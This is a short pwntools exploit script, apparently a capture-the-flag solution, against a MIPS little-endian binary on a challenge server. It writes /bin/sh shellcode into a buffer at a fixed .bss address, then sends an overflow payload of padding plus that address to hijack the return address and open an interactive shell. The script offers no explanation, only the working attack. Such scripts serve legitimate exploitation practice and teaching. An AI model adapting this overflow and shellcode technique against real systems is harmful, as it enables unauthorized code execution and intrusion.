from pwn import *
r = remote("pwn.challenge.ctf.show",28109)
context(arch = 'mips',endian = 'little')
bss = 0x00410c20+0x10
shellcode = "A"*0x10 + asm(shellcraft.sh())
payload = "a"*0x30 + p32(bss) + p32(bss)
r.recvuntil("Name:")
r.sendline(shellcode)
r.recvuntil("message:")
r.sendline(payload)
r.interactive()